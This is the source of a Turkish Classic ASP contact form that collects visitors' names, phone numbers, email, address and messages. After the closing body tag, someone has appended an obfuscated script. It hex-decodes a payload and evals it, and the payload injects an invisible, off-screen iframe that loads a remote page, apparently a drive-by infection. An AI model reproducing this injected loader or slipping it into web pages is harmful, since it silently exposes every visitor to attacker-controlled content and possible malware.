<%										   
'***********************************************'
' Script    : Bilgi Edinme Sistemi V.1.0  		'
' Tarih     : 05 Ocak 2005, Saat : 17.44  		'
' Oluşturma : Talha Çopur				  		'
' E-Mail    : copurellezi@hotmail.com     		'
' Web		: http://www.talha.org		  		'
' ---------------------------------------------	'
' Belki de kodların tamamına yakını		  		'
' AtaBerK Ileti Script v2.0 den editlenmiştir 	'
' Bu noktada bu scripti hazırlamama		  		'
' vesile olan, Mehmet Ayhan Taçyıldız'a   		'
' şükranlarımı sunuyorum.				  		'
' ---------------------------------------------	'
' Ayrıca ; www.aspindir.com ' a da bu vesile ile'
' en derin teşekkürlerimi iletiyorum. Emeği		'
' geçenleri kutluyor, tebrik ediyorum. 			'
'***********************************************'
%>
<title><> Bilgi Edinme Mesaj <></title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9">
<meta http-equiv="Content-Language" content="tr">
<link href="sekil.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #FF0000;
}
-->
</style><div align="center">
  <table width="446" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td><div align="center"><img src="resimler/BilgiEdinme001.jpg" width="429" height="73" /></div></td>
    </tr>
    <tr>
      <td><form action="islemyap.asp" method="post">
        <table width="446" height="633" border="0" align="center" cellpadding="0" cellspacing="0" background="resimler/formback.jpg">
          <tr>
            <td width="332"><table width="150%" border="0" align="center" cellpadding="5" cellspacing="1">
                <tr>
                  <td valign="top"><table border="0" cellpadding="0" cellspacing="2" style="border-collapse: collapse" width="100%" id="AutoNumber2" align="center">
                      <tr>
                        <td width="41%" height="35" valign="top"><div align="right"><b>Kullanıcı Tipi : </b> </div></td>
                        <td width="59%"><select name="kultur" size="3" multiple="multiple" id="kultur" style="border:1px dashing #FF0000; font-family: Tahoma; font-size: 8pt; ">
                            <option value="Ev Kullanıcı">Ev Kullanıcı</option>
                            <option value="Internet Cafe">Internet Cafe</option>
                            <option value="Şirket">Şirket</option>
                          </select>                        </td>
                      </tr>
                      <tr>
                        <td width="41%" valign="middle"><div align="right"><b>Adınız Soyadınız</b> : </div></td>
                        <td width="59%" height="18" valign="middle"><input  type="text" name="isim" style="border=1px solid #FF0000; " 1px dashing="dashing"" size="20" maxlength="30" /></td>
                      </tr>
                      <tr>
                        <td width="41%" valign="middle"><div align="right"><b>Telefon Numaranız</b> : </div></td>
                        <td width="59%" valign="middle"><input type="text" name="tel" style="border=1px solid #FF0000; " 1px dashing="dashing"" size="20" maxlength="11" />                        </td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right">
                            <div align="right"><b>Cep Tel  Numaranız</b> : </div>
                        </div></td>
                        <td valign="middle"><input type="text" name="ceptel" style="border=1px solid #A0A0A0; " 1px dashing="dashing"" size="20" maxlength="11" /></td>
                      </tr>
                      <tr>
                        <td width="41%" valign="middle"><div align="right"><b>Fax Numaranız :</b></div></td>
                        <td width="59%" height="29" valign="middle"><input type="text" name="faks" style="border=1px solid #A0A0A0; " 1px dashing="dashing"" size="20" maxlength="11" />                        </td>
                      </tr>
                      <tr>
                        <td width="41%" valign="middle"><div align="right"><b>E-Mail Adresiniz </b> : </div></td>
                        <td width="59%" height="23" valign="middle"><input type="text" name="email" style="border=1px solid #FF0000; " 1px dashing="dashing"" size="20" maxlength="30" />                        </td>
                      </tr>
                      <tr>
                        <td width="41%" valign="middle"><div align="right"><b>İrtibat Adresiniz :</b></div></td>
                        <td width="59%" valign="middle"><textarea name="adres" style="border:1px solid #A0A0A0; 1px" rows="2" cols="20"></textarea></td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right"><b>Bulunduğunuz Şehir : </b></div></td>
                        <td valign="middle"><input type="text" name="sehir" style="border=1px solid #FF0000; " 1px dashing="dashing"" size="20" maxlength="30" /></td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right"><b>Bulunduğunuz Ülke : </b></div></td>
                        <td valign="middle"><input type="text" name="ulke" style="border=1px solid #FF0000; " 1px dashing="dashing"" size="20" maxlength="30" /></td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right"><b>Mesajınız :</b></div></td>
                        <td><textarea name="ileti" style="border:1px solid #FF0000; 1px" rows="8" cols="20"></textarea></td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right"><b>Size Nasıl Bilgi Verelim ? :</b></div></td>
                        <td valign="middle"><select name="geridon" size="2" multiple="multiple" id="geridon" style="font-family: Tahoma; font-size: 8pt; border-style: solid #FF0000;">
                            <option value="E-Posta İle">E-Posta ile</option>
                            <option value="Telefon İle">Telefon ile</option>
                        </select></td>
                      </tr>
                      <tr>
                        <td valign="middle"><div align="right"><b>Başvuru Tarihi :</b></div></td>
                        <td valign="middle"><% Response.Write Date %>
                            <b>
                            <% Response.Write Time %>
                            </b>
                            <input type="hidden" name="tarih" value="<% Response.Write Date %>"/>
                            <input type="hidden" name="saat" value="<% Response.Write Time %>"/></td>
                      </tr>
                      <tr>
                        <td valign="top">&nbsp;</td>
                        <td><table border="0" cellpadding="0" cellspacing="2" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2" align="center">
                            <tr>
                              <td width="60%"><a href="&lt;input type=&quot;submit&quot;"></a>
                                  <input type="submit"  value="MESAJI GÖNDER" style="border: 1px solid #CCCCCC; font-family:Tahoma; font-size:8pt; font-weight:bold" name="submit" />
                                  <input type="reset"  value="TEMİZLE" style="border: 1px solid #CCCCCC; font-family:Tahoma; font-size:8pt; font-weight:bold" name="reset" />                              </td>
                            </tr>
                        </table></td>
                      </tr>
                      <tr>
                        <td valign="top">&nbsp;</td>
                        <td>&nbsp;</td>
                      </tr>
                      <tr>
                        <td colspan="2" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="3%">&nbsp;</td>
                            <td width="73%"><font size="1"><span class="style1"><b>Not :</b></span> <span class="style1">Kırmızı çerçeveli alanların doldurulması gerekmektedir. Size daha iyi bir hizmet sunabilmemiz için bu alanlara gireceğiniz bilgiler gereklidir. Teşekkür ederiz ... </span></font></td>
                            <td width="24%">&nbsp;</td>
                          </tr>
                        </table></td>
                        </tr>
                    </table>
                      </td>
                </tr>
            </table></td>
          </tr>
        </table>
      </form></td>
    </tr>
  </table>
  </div>
</body>
   <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </html>    